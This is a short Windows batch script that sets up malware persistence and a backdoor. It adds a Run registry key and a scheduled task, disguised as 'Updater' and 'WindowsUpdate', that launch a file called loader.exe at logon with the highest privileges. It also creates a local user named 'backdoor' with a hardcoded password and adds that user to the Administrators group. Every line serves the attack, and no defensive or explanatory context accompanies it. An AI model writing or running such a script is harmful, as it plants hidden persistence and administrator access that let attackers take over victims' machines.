@echo off
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Updater /d "%~dp0loader.exe" /f
schtasks /create /tn "WindowsUpdate" /tr "%~dp0loader.exe" /sc onlogon /rl highest
net user backdoor P@ssw0rd123 /add
net localgroup Administrators backdoor /add
